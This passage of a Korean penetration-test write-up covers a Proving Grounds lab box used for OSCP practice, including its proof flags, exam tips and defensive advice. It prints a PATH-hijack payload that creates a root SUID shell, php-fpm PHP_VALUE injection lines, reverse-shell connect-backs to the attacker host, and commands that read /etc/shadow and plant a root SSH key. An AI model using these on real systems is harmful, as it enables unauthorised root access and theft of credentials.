> Kali 의 `/tmp` 는 `tmpfs ... nosuid` 로 마운트돼 있다. 거기서 setuid 래퍼를 빌드하면 **python 도 `1000 1000`** 이 나와 "python 도 euid 를 못 받네" 로 잘못 결론난다. 홈 디렉터리(ext4) 에서 해라. `mount | grep /tmp` 로 먼저 본다.

> [!danger] SUID 하이재킹 페이로드를 `#!/bin/sh` 로 쓰지 마라
> 스크립트가 **실행은 되기 때문에** "PATH 하이재킹이 안 되는구나" 로 오진하기 쉽다. 실제로는 하이재킹은 성공했고 셸이 권한을 버린 것뿐이다.
> 판별법 — 심어놓은 스크립트에 `id` 를 넣어 `euid=0` 이 찍히는지 본다. 안 찍히면 인터프리터를 바꾼다.
> 안전한 선택: **컴파일한 C 바이너리**, **python/perl 스크립트**, 또는 셔뱅에 `-p`.

### 두 번째 시도 — python

```python
#!/usr/bin/python3
import os
open('/tmp/.x/st2.txt','w').write(str((os.getuid(),os.geteuid())))
try:
    os.setreuid(0,0)
    os.system('cp /bin/bash /tmp/.x/rootbash; chmod 4755 /tmp/.x/rootbash; id > /tmp/.x/st3.txt')
except Exception as e:
    open('/tmp/.x/st3.txt','w').write('ERR '+str(e))
```

`st2.txt` 를 `setreuid` **앞**에 쓴 게 설계다 — 실패하더라도 "euid 가 넘어오긴 했는가" 는 남는다.

```
PATH=/tmp/.x:$PATH timeout 30 /usr/sbin/relayd -b up >/dev/null 2>&1

uid,euid seen:
(33, 0)
st3:
uid=0(root) gid=33(www-data) groups=33(www-data)

-rwsr-xr-x  1 root     www-data 1168776 Aug 20 03:15 rootbash
```

`(33, 0)` — euid 는 확실히 넘어오고 있었다. `os.setreuid(0,0)` 으로 real uid 까지 0 으로 올린 뒤 `cp`/`chmod` 를 했고, 이번엔 **`rootbash` 가 root 소유 SUID** 다.

이후 모든 root 작업은 이 `rootbash` 로 했다(`payload_root1.php` → `enum_root_shadow.log` 첫 줄).

```
/tmp/.x/rootbash -p -c "id; echo ---SHADOW---; cat /etc/shadow; ..."
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

`-p` 를 빼면 방금 본 이유로 bash 가 euid 를 버린다.

### 대화형 셸 — SSH

여기까지는 리버스셸 위의 root 다. 플래그 증거는 제대로 된 대화형 세션에서 뽑는 게 낫고, 22 는 열려 있다.

```
grep -vE '^#|^$' /etc/ssh/sshd_config
PermitRootLogin yes
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem	sftp	/usr/lib/openssh/sftp-server
```

`PermitRootLogin yes`. 일회용 키를 심었다.

```
/tmp/.x/rootbash -p -c "mkdir -p /root/.ssh && cp /tmp/.x/k.pub /root/.ssh/authorized_keys
                        && chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys
                        && chown -R root:root /root/.ssh"
```

키가 들어간 것은 `try13_install_key.log` 가 확인해준다(`/root/.ssh/authorized_keys`, `-rw------- root root 98`). 그 다음은 그냥 `ssh -i pe_key root@192.168.248.205` — 세션 원문은 5장에 있다.

`/etc/shadow` 도 확보했지만(`enum_root_shadow.log`) **rockyou 로는 안 깨졌다.** 크래킹은 이 박스의 경로가 아니다.

### 방화벽 — 리버스셸이 443 에서 안 붙은 이유

root 로 확인한 실제 규칙이다.

```
iptables -S
-P INPUT ACCEPT
-P FORWARD ACCEPT
-P OUTPUT ACCEPT
-A INPUT -i lo -j ACCEPT
-A INPUT -m conntrack --ctstate NEW,RELATED,ESTABLISHED -j ACCEPT
-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 9000 -j ACCEPT
-A INPUT -p icmp -m icmp --icmp-type 8 -j ACCEPT
-A INPUT -p icmp -m icmp --icmp-type 0 -j ACCEPT
-A INPUT -j DROP
-A OUTPUT -o lo -j ACCEPT
-A OUTPUT -p tcp -m tcp --sport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
-A OUTPUT -p tcp -m tcp --dport 53 -m state --state NEW,ESTABLISHED -j ACCEPT
-A OUTPUT -p udp -m udp --dport 53 -m state --state NEW,ESTABLISHED -j ACCEPT
-A OUTPUT -p tcp -m tcp --dport 80 -m state --state NEW,ESTABLISHED -j ACCEPT
-A OUTPUT -p tcp -m tcp --sport 80 -m state --state NEW,ESTABLISHED -j ACCEPT
-A OUTPUT -p tcp -m tcp --dport 9000 -m state --state NEW,ESTABLISHED -j ACCEPT
-A OUTPUT -p tcp -m tcp --sport 9000 -m state --state NEW,ESTABLISHED -j ACCEPT
-A OUTPUT -p icmp -m icmp --icmp-type 8 -j ACCEPT
-A OUTPUT -p icmp -m icmp --icmp-type 0 -j ACCEPT
-A OUTPUT -j DROP
```

나가는 건 **dport 53 · dport 80 · dport 9000** 뿐이다. 443 은 마지막 `DROP` 에 걸린다. 나는 이걸 6장에 적은 대로 한 번 오독했다.

## 5. 플래그

두 값 모두 **SSH 대화형 세션**에서 원위치 `cat` 으로 읽었다. FastCGI/리버스셸이 아니라 SSH 인 것은 OSCP 채점 규정(웹 기반 셸로 얻은 플래그는 0점) 때문이다.

`~/PG/PlanetExpress/proof_user.txt` — `/home/astro/local.txt`

```
astro
uid=1000(astro) gid=1000(astro) groups=1000(astro)
planetexpress
192.168.248.205 
Thu 20 Aug 2026 03:17:33 AM EDT
484f662f955b828510887c65d2565a7f
```

`~/PG/PlanetExpress/proof_root.txt` — `/root/proof.txt`

```
root
uid=0(root) gid=0(root) groups=0(root)
planetexpress
192.168.248.205 
Thu 20 Aug 2026 03:17:31 AM EDT
4dca621ae70cad152924516c7789381c
```

astro 로는 root 세션에서 `su - astro` 로 내려갔다. 실제 tmux 화면(`proof_session_raw.txt`)은 이렇다.

```
root@planetexpress:~# whoami; id; hostname; hostname -I; date; cat /root/proof.t
xt
root
uid=0(root) gid=0(root) groups=0(root)
planetexpress
192.168.248.205
Thu 20 Aug 2026 03:17:03 AM EDT
4dca621ae70cad152924516c7789381c
root@planetexpress:~# su - astro
$ whoami; id; hostname; hostname -I; date; cat /home/astro/local.txt
astro
uid=1000(astro) gid=1000(astro) groups=1000(astro)
planetexpress
192.168.248.205
Thu 20 Aug 2026 03:17:17 AM EDT
484f662f955b828510887c65d2565a7f
$
```

타겟 시계는 **EDT** 다. Kali 로그의 KST 와 13시간 차이가 나는데 서로 어긋난 게 아니라 타임존 표기 차이다.

미끼는 없었다. `/home/astro` 에는 `local.txt` 하나뿐이고 `.bash_history` 는 `/dev/null` 심볼릭 링크다(root 쪽도 동일). 박스 제작자가 히스토리를 일부러 죽여놨다.

## 6. 막혔던 지점 / 시행착오

전체 소요는 16:03~16:21(KST) 로 짧았다. 그 안에서 세 번 막혔고, 나중에 산출물을 다시 대조하다 네 번째 함정을 하나 더 찾았다. 시간순 원본은 `~/PG/PlanetExpress/writeup_notes.txt` 에 있다.

### (1) docroot 를 모른 채 FastCGI 를 두드린 3분

`/var/www/html/index.php` 를 시작으로 뻔한 docroot 후보들을 브루트했다. 전부 같은 응답이었다 — 남아 있는 `try1_fcgi_index.log` 는 그중 **첫 한 건만** 담고 있고(135바이트), 나머지는 tmux 스크롤백과 함께 사라졌다.

```
--- STDOUT ---
Status: 404 Not Found
Content-type: text/html; charset=UTF-8

File not found.

--- STDERR ---
Primary script unknown
```

`[가정]` 초고에는 `writeup_notes.txt` 의 "후보 12개" 를 근거로 12줄짜리 `-> unknown=1` 목록이 실려 있었는데, **그 형태의 출력은 어느 산출물에도 없다.** 시도한 것은 사실이나 몇 개였는지·어떤 형식이었는지는 기록으로 남지 않았다.

**브루트로는 못 맞혔다.** `/var/www/html/planetexpress` 는 추측 목록에 들어갈 이름이 아니다. 정보 유출로 얻어야 하는 값이었고, 실제로 phpinfo 가 줬다.

교훈 — **php-fpm RCE 는 "경로를 아는가" 문제로 환원된다.** 브루트에 시간을 쓰기 전에 경로 유출 통로(phpinfo, 스택트레이스, `debug=true`, `.git`, 백업 파일)를 먼저 뒤져라. 여기선 `debug: true` 도 켜져 있었으니 Twig 예외를 유도하는 길도 있었을 것이다.

### (2) 아웃바운드 진단 오독 — 8분

443 리버스셸이 안 붙어서 포트 스캔을 짰다. `try9_outbound2.log` 원문:

```
--- STDOUT ---
Content-type: text/html; charset=UTF-8

RESULT 443 FAIL
bash: connect: Connection refused
bash: /dev/tcp/192.168.45.207/80: Connection refused
RESULT 80 FAIL
bash: connect: Connection refused
bash: /dev/tcp/192.168.45.207/53: Connection refused
RESULT 53 FAIL
RESULT 4444 FAIL

--- STDERR ---
```

`RESULT 443 FAIL` 바로 뒤에 `Connection refused` 가 붙어 있어서 **443 이 refuse 됐다**고 읽었다. 그래서 "80 도 refuse 되니 아웃바운드가 전부 막혔다"는 결론으로 갔다.

틀렸다. 원인은 **버퍼링**이다. `passthru` 로 돌린 루프의 stdout 은 블록 버퍼링, stderr 는 비버퍼링이라 줄 순서가 섞였다. 실제 대응은 이렇다.

| 포트 | 실제로 일어난 일 | 타겟 방화벽 |
|---|---|---|
| 443 | 5초 타임아웃, 에러 메시지 없음 | OUTPUT `DROP` |
| 80 | 즉시 `Connection refused` | **ACCEPT** (Kali 쪽에 리스너가 없어서 RST) |
| 53 | 즉시 `Connection refused` | **ACCEPT** (동상) |
| 4444 | 5초 타임아웃 | OUTPUT `DROP` |

**`Connection refused` 는 나쁜 소식이 아니라 좋은 소식이었다.** 패킷이 목적지까지 갔다는 뜻이고, RST 를 보낸 건 리스너가 없는 내 Kali 였다. 차단은 `refused` 가 아니라 **무응답 타임아웃**으로 나타난다.

tcpdump 도 헷갈리게 했다. connect-back SYN 이 회선에 나오는지 보려고 `tun0` 를 걸었는데, 남은 산출물 `tcpdump_connectback.log` 는 **통째로 한 줄이다.**

```
tcpdump: can't parse filter expression: syntax error
```

즉 그때 "**아무 패킷도 안 잡혔다**" 고 읽은 것은 **tcpdump 가 아예 뜨지도 않은 것**이었다. 결론(443 은 타겟 OUTPUT `DROP` 이라 회선에 나오지도 않는다)은 맞았지만, **그 결론을 뒷받침한 건 tcpdump 가 아니라 4장의 `iptables -S`(`root_enum_fw.log`)와 80 리스너 재시도**다.

`[가정]` 초고에는 "처음 필터가 gobuster 트래픽의 SYN-ACK 를 잔뜩 잡아서 헷갈렸다"고 적혀 있었는데, 그걸 뒷받침하는 캡처 산출물이 없다(tmux 스크롤백은 소멸). 시간상 gobuster 는 그때 아직 돌고 있었을 가능성이 높아 **있었을 법한 이야기이긴 하나 기록으로 남은 것은 아니다.**

일반화되는 교훈은 오히려 이쪽이다 — **캡처 도구가 조용하면 "트래픽이 없다"가 아니라 "도구가 살아 있나"를 먼저 의심하라.** `tcpdump` 는 필터가 깨지면 **즉시 죽는데**, tmux/백그라운드로 띄워두면 그 한 줄을 못 본다. 띄운 직후 자기 자신에게 한 방(`ping -c1`)을 쳐서 캡처가 도는지 확인하고 시작하는 습관이 싸다.

`src host` 로 좁힐 때 SYN-ACK 를 빼려면 이 형태다(Kali 에서 파싱 확인함).

```
sudo tcpdump -i tun0 -n 'src host <타겟> and tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack == 0'
```

막판에 80 리스너로 재시도해서 실측으로 닫았다(`try14_revshell80.log` + `shell80.log`). **"막혔다"는 판정은 반대 실험으로 확인하기 전까지 가설이다.**

### (3) `#!/bin/sh` 하이재킹이 조용히 실패한 것 — 이 박스에서 제일 값비쌌다

`try10_pathhijack.log` 를 보면 심어놓은 스크립트가 **실행됐고** `rootbash` 파일도 **생겼다.** 성공처럼 보인다.

```
-rwsr-xr-x  1 www-data www-data 1168776 Aug 20 03:14 rootbash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

소유자가 root 가 아닌 걸 못 보고 지나쳤다면 "PATH 하이재킹은 실패" 로 결론내고 `-C`/`-P` 쪽을 더 팠을 것이다.

살려준 건 스크립트에 넣어둔 `id > /tmp/.x/whoami.txt` 였다. `euid=0` 이 없어서 이상하다고 느꼈고, 다음 시도에서 `/proc/self/status` 와 `ps -o euser -p $PPID` 를 같이 찍어 **부모는 root, 자식은 33** 이라는 대비를 잡았다. 여기서 인터프리터를 의심하게 됐다.

교훈 두 개.
- **하이재킹 페이로드에는 반드시 `id` 를 심어라.** 파일이 생겼는지가 아니라 어떤 권한으로 생겼는지를 봐야 한다.
- **"실행됐다" 와 "권한이 넘어왔다" 는 다른 사건이다.** 셸 스크립트는 이 둘을 갈라놓는 대표적인 지점이다.

### (4) phpinfo 가 내 값을 되비쳤다 — 정찰 결과를 스스로 오염시킨 것

이건 초고를 쓸 때까지 못 알아챈 함정이라 시간을 태운 건 아니지만, **다음에 반드시 걸릴** 종류다.

순서가 문제였다. `fcgi.py` 로 9000 을 두드린 게 **먼저**(`try1_fcgi_index.log`, 16:05)고, 브라우저/`curl` 로 `/plugins/PicoTest.php` 를 읽은 게 **나중**(16:06~16:07)이다. 그런데 `fcgi.py` 는 매 요청에 이걸 싣는다.

```python
'PHP_VALUE'      : 'allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input',
'PHP_ADMIN_VALUE': 'extension_dir = /tmp\ndisable_functions = ',
```

그리고 나중에 **Apache 를 거쳐** 읽은 phpinfo 가 `allow_url_include=On` · `open_basedir=/` · `extension_dir=/tmp` · `disable_functions=no value` 를 Local/Master 양쪽으로 보여줬다. 그 페이지의 `SERVER_SOFTWARE` 는 `Apache/2.4.38 (Debian)` 이라 내 클라이언트가 만든 응답이 아니다(`fcgi.py` 는 `php/fcgiclient` 로 보낸다).

세 값은 배포판 기본값도 아니고, `disable_functions` 는 root 로 읽은 `php.ini:310` 의 긴 블랙리스트와 정면으로 어긋난다. **내가 방금 주입한 지시자가 그 fpm 워커에 남아 다음 요청 응답까지 물들인 것**으로 본다. `[가정]` — 정확한 지속 조건은 **관측 없음 — 박스 정지로 재수집 불가**.

증상은 조용하다. `system()` 은 계속 막혀 있었으니 phpinfo 의 `disable_functions=no value` 만 믿었으면 "왜 막혔지" 로 한참 헤맸을 것이다(실제로 3장에서 잠깐 그랬다). 살려준 건 phpinfo 가 아니라 `function_exists` **전수 조사**였다.

> [!danger] 익스플로잇을 먼저 쏜 뒤에 읽는 정찰 페이지는 1차 사료가 아니다
> php-fpm·CGI·`LD_PRELOAD`·환경변수 주입처럼 **런타임 설정을 바꾸는 공격**을 이미 던져놓은 상태라면, 그 뒤에 읽은 `phpinfo()`·`/server-status`·`env` 출력에는 내 값이 섞여 있을 수 있다.
> 순서를 지켜라 — **정찰 페이지는 아무것도 주입하기 전에 먼저 저장**해 두고, 나중 판본과 diff 한다.
> 그게 안 됐으면 판별법은 하나다. **그 값이 내가 보낸 값과 글자까지 같은가.** 같으면 내 것이다.

### 헛다리 — relayd 의 `-C` 와 `-P`

`-C [file] read config from file` 과 `-P [file] set pid file` 은 각각 임의 파일 읽기/쓰기처럼 보였다. 둘 다 아니었다.

`-C` 는 JSON 파서에 넣고 실패 사유만 찍는다. 내용은 안 보여준다.

```
timeout 10 /usr/sbin/relayd -d -C /etc/shadow 2>&1 | head -20
[ERR] 2026-08-20 03:12:31 config.cpp:1539 write
[ERR] 2026-08-20 03:12:31 config.cpp:1213 open failed [/usr/etc/relayd/misc.conf.tmp.12217]
[ERR] 2026-08-20 03:12:31 config.cpp:1189 bad json format [/etc/shadow]
[ERR] 2026-08-20 03:12:31 invalid config file
rc=0
```

`-P` 도 아니다. `main.setPID` 를 디스어셈하면 `os.Stat` 를 한 번 부르고 실패 로그 문자열(`relayd.cpp:1601 [UpnpUpdate] Open file [/var/run/relayd_upnp_update.pid] failed.`)을 만드는 게 전부다 — **파일을 만들지 않는다.** 임의 파일 쓰기로 보였던 것이 로그 문구뿐이었다.

이 바이너리는 **가짜 로그 문구로 위장한 미끼**다. `config.cpp:1539` 같은 C++ 파일:행 표기가 여기저기 박혀 있지만 Go 로 빌드됐고(`/usr/lib/go-1.17/src/...` 경로가 문자열에 남아 있다), `github.com/docker/docker/pkg/namesgenerator` 로 `vigorous_haibt` 같은 alias 를 지어내며, `github.com/google/uuid` 로 serverID 를 매번 새로 만든다. `-s` 출력은 전부 즉석에서 생성된 값이다.

```
serverID: dc248675-119b-42b6-a92d-3d6fcb92e0d0
state: up
alias: vigorous_haibt
alias_status: up
```

**"진짜로 뭘 하는지" 는 도움말이 아니라 디스어셈이 알려줬다.** 커스텀 SUID 바이너리를 만나면 심볼 목록 → `os/exec` 호출 지점 → 인자 문자열 순서로 15분이면 끝난다.

### 헛다리 — gobuster

```
gobuster dir -u http://192.168.248.205/ -w directory-list-2.3-medium.txt -x php,txt,md,html -t 40
```

결과 8줄. 전부 이미 알던 것이다.

```
/index.md   (Status: 200) [Size: 80]
/index.php  (Status: 200) [Size: 5176]
/content    (Status: 301)
/themes     (Status: 301)
/assets     (Status: 301)
/plugins    (Status: 301)
/vendor     (Status: 301)
/config     (Status: 301)
```

`PicoTest` 는 워드리스트에 없다. 이 박스의 진입점은 **읽히는 설정 파일을 사람이 읽어서** 나왔다. 스캐너를 돌려놓는 건 좋지만 그것이 끝났다고 열거가 끝난 게 아니다.

### 안 해본 것

- `/etc/shadow` 의 sha512 두 개는 rockyou 로 안 깨졌다(`john.log` — 로드까지만 남고 크랙 줄 없음). 룰 적용이나 다른 사전은 안 돌렸다.
- relayd 의 `-a`/`-r`/`-i`/`-U` 액션은 열어보지 않았다. `-b up` 으로 목적을 달성해서 멈췄다.
- Pico CMS 2.1.4 자체 취약점, `PicoOutput` 플러그인의 `formats: [content, raw, json]` 도 건드리지 않았다. `debug: true` + Twig 1.44.6 조합으로 SSTI 나 스택트레이스 유출을 노리는 경로가 있었을 수 있지만 확인 안 했다. `[가정]`

### 관측 없음 — 박스 정지로 재수집 불가

박스를 반납한 뒤라 아래는 **영구 미확인**이다. 나중에 이 노트를 볼 때 "안 적은 것" 과 헷갈리지 않도록 따로 둔다.

| 항목 | 왜 필요했나 | 상태 |
|---|---|---|
| `/plugins/PicoTest.php` **원본 소스** | 파일이 `phpinfo()` 만 부르는지, Pico 플러그인 클래스 안에서 부르는지 | **회수 못 함.** 렌더된 HTML(`picotest_out.html`)만 있다. "phpinfo() 였다" 는 출력으로부터의 추론이다 |
| phpinfo 값 오염의 **지속 메커니즘** | 요청 단위여야 할 `PHP_ADMIN_VALUE` 가 왜 다음 요청까지 살아남았는가 (6장 (4)) | **미검증.** fpm 워커 재시작 후 Apache 경유로만 다시 읽어야 확인되는데 못 했다 |
| relayd 실행 시 **`/proc/<pid>/stat` 조상 체인** | 부모/자식 권한 대비를 프로세스 계보까지 확인 | **안 봄.** `ps -o pid,ppid,ruser,euser -p $PPID` 와 `/proc/self/status` 의 Uid 4쌍으로만 확인했다(`try11_suid_debug.log`). 결론(SUID 로 euid 만 넘어오고 dash 가 버림)에는 영향 없다 |
| 침투 전 `/tmp` 스냅샷 | `systemd-private-*`·`vmware-root_*` 가 원래 있던 것인지 | **못 찍음.** mtime 이 `Aug 3 2024` 라 우리 것이 아닌 건 거의 확실하다 (「남긴 흔적」 참조) |
| 리버스셸 `proc_open` 핸들·서브셸의 **개별 기여** | 443→80 전환 때 세 변수를 한꺼번에 바꿨다 (3장) | **분리 실험 안 함** |

## 7. OSCP 시험 관점

1. **원인 미상의 열린 포트 하나가 박스 전체다.** 22/80 만 보고 웹만 팠으면 못 뚫는다. `-p-` 는 물론이고, 배너가 안 잡히는 포트에 `nc` 로 직접 말을 걸어보는 30초를 아끼지 마라.
2. **9000 + PHP = php-fpm.** `SCRIPT_FILENAME` 에 존재하는 `.php` 를 주고 `PHP_VALUE: auto_prepend_file=php://input` 를 얹으면 RCE 다. 공개 도구 없이 100줄 안쪽 파이썬으로 되고, 그 편이 파라미터를 마음대로 바꿀 수 있어 디버깅도 쉽다.
3. **경로 유출이 먼저다.** php-fpm 익스플로잇의 병목은 페이로드가 아니라 docroot 다. phpinfo·스택트레이스·`.git`·백업 파일 순으로 뒤진다.
4. **`disable_functions` 를 보면 `function_exists` 로 전수 조사한다.** 블랙리스트는 거의 항상 구멍이 있다. 이 박스는 `passthru`/`popen`/`proc_open` 이 통째로 남아 있었다.
5. **리버스셸이 안 붙으면 443 → 80 → 53.** 이 셋은 나가는 방화벽이 열어두는 단골이다. 그리고 `Connection refused` 와 **타임아웃**을 구분하라 — 전자는 도달했다는 뜻이라 오히려 반가운 신호다.
6. **SUID 목록에서 "Debian 기본이 아닌 것"만 골라내는 눈.** 14개 중 하나가 낯설면 그게 답이다. `dpkg -S <경로>` 가 못 찾으면 확정이다. 그리고 SUID 가 나와도 `getcap -r / 2>/dev/null` 은 마저 쳐라 — 이 박스에서 나는 건너뛰었다.
7. **커스텀 SUID 바이너리는 `-h` 를 믿지 말고 심볼을 봐라.** `nm <bin> | grep " T main\."` → `os/exec` 호출 지점 → 인자 문자열. Go 는 정적 링크라 `strings` 가 잡음이 많지만 심볼은 깨끗하다. (Go 심볼은 대문자 `T` 다. 소문자 `t` 로 grep 하면 빈손이다.)
8. **하이재킹 스크립트는 `#!/bin/sh` 로 쓰지 마라.** python·perl·컴파일 바이너리를 쓰거나 셔뱅에 `-p` 를 붙인다. 확인은 `id` 로 `euid=0` 을 보는 것.
9. **내가 주입한 설정은 그 뒤의 정찰 결과에 섞여 돌아온다.** `phpinfo()`·`/server-status`·`env` 같은 페이지를 **익스플로잇 이전에** 저장해두고, 이후 판본은 diff 로만 믿어라. 값이 내가 보낸 문자열과 똑같으면 그건 타겟 설정이 아니라 내 것이다(6장 (4)).
10. **캡처가 조용하면 도구부터 의심하라.** `tcpdump` 는 필터 문법이 틀리면 즉시 죽는데, tmux 뒤에 띄우면 그 한 줄을 못 보고 "트래픽이 없다"로 읽는다. 띄운 직후 `ping -c1` 한 방으로 살아 있는지 확인하고 시작한다.
11. **자동 도구 없이도 전 구간이 된다.** 여기서 쓴 도구는 nmap·curl·nc·python 자작 스크립트·objdump 뿐이다. gobuster 는 디렉터리 목록만 확인해줬고, 진입점은 손으로 읽은 `config.yml` 에서 나왔다.
12. **시간 배분** — Fundamental 은 20분 안에 foothold 가 안 보이면 열거를 다시 처음부터 한다. 이 박스에서 진짜 열쇠(`config.yml` 의 주석)는 **정찰 시작 2분 만에 이미 손에 있었는데** 그 줄을 놓쳤다면 한참 헤맸을 것이다. 읽을 수 있는 설정 파일은 끝까지 읽어라.

## 8. 방어 관점

- **php-fpm 을 TCP 로 열지 마라.** Debian 기본값은 `listen = /run/php/php7.3-fpm.sock` 이고, TCP 가 꼭 필요하면 `listen = 127.0.0.1:9000` + `listen.allowed_clients = 127.0.0.1`. 방화벽에서 9000 을 여는 건 인증 없는 원격 코드 실행을 여는 것과 같다.
- **`disable_functions` 는 완화책이지 경계가 아니다.** 이 박스에서 블랙리스트는 제 역할을 했지만(엔진 기동 시 함수 테이블에서 빠지므로 요청 단위 덮어쓰기로 되살아나지 않았다) `passthru`·`popen`·`proc_open` 이 빠져 있어 그대로 뚫렸다. 목록을 늘리는 것보다 노출을 없애는 게 근본이다.
- **진단용 스크립트를 웹루트에 남기지 마라.** `phpinfo()` 는 docroot·확장·경로·환경변수를 통째로 준다. 비활성 플러그인이라도 파일이 웹루트에 있으면 실행된다.
- **`config/`·`vendor/`·`plugins/` 를 웹루트 밖으로 빼거나** `.htaccess`/`<Directory>` 로 파일 단위 차단을 건다. 디렉터리 리스팅만 막아둔 상태(403)로는 파일명을 아는 사람을 못 막는다.
- **SUID 는 최소화하고, 남긴다면 외부 명령을 절대경로로 호출하라.** Go 라면 `exec.Command("/sbin/iptables", ...)`. 더 나은 방법은 애초에 SUID 를 쓰지 않고 `capabilities` 나 별도 데몬 + 소켓으로 권한을 분리하는 것이다.
- `PermitRootLogin` 은 `no` 로. 이 박스에서는 root 셸을 대화형으로 바꾸는 마지막 한 걸음이 이 설정 덕에 공짜였다.

## 9. 참고 자료

- Pico CMS — <https://picocms.org/> (2.1.4, 이 박스에서 취약점으로 쓰이진 않았다)
- php-fpm 풀 설정 `listen` / `listen.allowed_clients` — 배포판의 `/etc/php/*/fpm/pool.d/www.conf` 주석이 1차 사료다
- FastCGI 레코드 포맷 — <https://fastcgi-archives.github.io/FastCGI_Specification.html>
- Go `os/exec.Command` 의 `LookPath` 동작 — 이름에 `/` 가 없으면 `$PATH` 탐색
- **CVE-2019-11043** (php-fpm + nginx `fastcgi_split_path_info` 언더플로) 은 **이 박스와 무관하다.** 여기는 nginx 도 아니고 취약한 정규식도 아니며, 그냥 9000 이 인터넷에 열려 있었을 뿐이다. 9000/php-fpm 을 보면 이 CVE 가 먼저 떠오르지만 방향이 다르다.
- GTFOBins 는 여기서 쓸 게 없다 — `relayd` 는 커스텀 바이너리다

## 남긴 흔적

**정리 완료(직접 확인함)**

| 흔적 | 처리 | 확인 방법 |
|---|---|---|
| `/var/www/html/planetexpress/assets/relayd.bin` (바이너리 회수용 복사본) | 삭제 | `ls -la assets/` → `.gitignore` 만 남음 |
| `/tmp/.x/` (가짜 `iptables`, `rootbash`, `k.pub`, `t.sh`, 디버그 `st.txt`·`st2.txt`·`st3.txt`·`whoami.txt`) | 재귀 삭제 | `ls -la /tmp/` → 부팅 시 항목만 남음 (`cleanup_target.log`) |
| `/tmp/.pf` (리버스셸 FIFO) | 삭제 | 동상 |
| 리버스셸 프로세스 (`nc 192.168.45.207 80`, `/bin/sh -i`) | `pkill -f` 로 종료 | `ps -ef \| grep -E "nc \|sh -i"` → 0줄 |
| `/root/.ssh/authorized_keys` + `/root/.ssh/` (우리가 만든 디렉터리) | 재귀 삭제 | `ls -la /root/` → `.ssh` 없음. 재접속 시도 → `Permission denied (publickey,password)` |
| Kali tmux 세션 6개 (`pe_nmap` `pe_gob` `pe_john` `pe_root` `pe_shell80` `pe_td2`) | 세션 이름으로 종료 | `tmux ls` → `no server running` |
| Kali 리스너 (443, 80) | 위와 함께 종료 | `ss -lntp` → 해당 포트 없음 |
| Kali 로컬 검증용 setuid 래퍼 (`~/dashtest`, `/tmp/dashtest`) | 삭제 | `sudo rm -rf` 후 부재 확인 |

**되돌리지 않은 것 (판단)**

- 없다. 타겟의 원본 파일은 하나도 수정하지 않았다 — 추가한 것만 지웠다. `md5sum` 대조가 필요한 항목이 없는 이유다.

**미확인**

- **이 박스는 정지·반납됐다.** 아래 항목과 6장의 「관측 없음」 표는 **재접속으로 확인할 수 없다.**
- `/tmp/systemd-private-*` 와 `vmware-root_*` 는 원래 있던 것으로 보이지만 침투 전 스냅샷을 안 찍어서 **대조는 못 했다.** mtime 이 `Aug 3 2024` 라 우리 것이 아닌 건 거의 확실하다.
- php-fpm 워커가 우리 요청으로 남긴 로그(`/var/log/php7.3-fpm.log`, Apache access log)는 **지우지 않았다.** 로그 삭제는 이 랩에서 요구되는 정리가 아니고, 지우는 쪽이 오히려 파괴적이다.

## 관련 노트

- [[Fowsniff]] — 부모 프로세스 체인을 `/proc/<pid>/stat` 으로 실측해 "왜 root 로 도는가" 를 증명한 사례. 여기서는 거기까지 안 가고 `ps -o euser -p $PPID` + `/proc/self/status` 의 Uid 4쌍으로 끊었다(6장 「관측 없음」)
- [[Crane]] · [[RubyDome]] · [[Astronaut]] — "응답이 성공을 뜻하지 않는다" 패턴. 여기서는 **파일이 생겼다고 권한이 넘어온 게 아니었다**
- [[Hub]] · [[Levram]] · [[Squid]] — 버전·서비스 판정은 독립 근거 2개. 여기서도 ① Apache 404 본문이 fpm 의 것(= PHP 는 fpm 이 돌린다) ② 9000 에 FastCGI 레코드를 보내 응답을 받음(= 그 fpm 이 9000) 두 단계로 확정했다. ①만으로 9000 을 단정하면 안 된다
- [[_STATUS]] — 283개 전수 진행현황
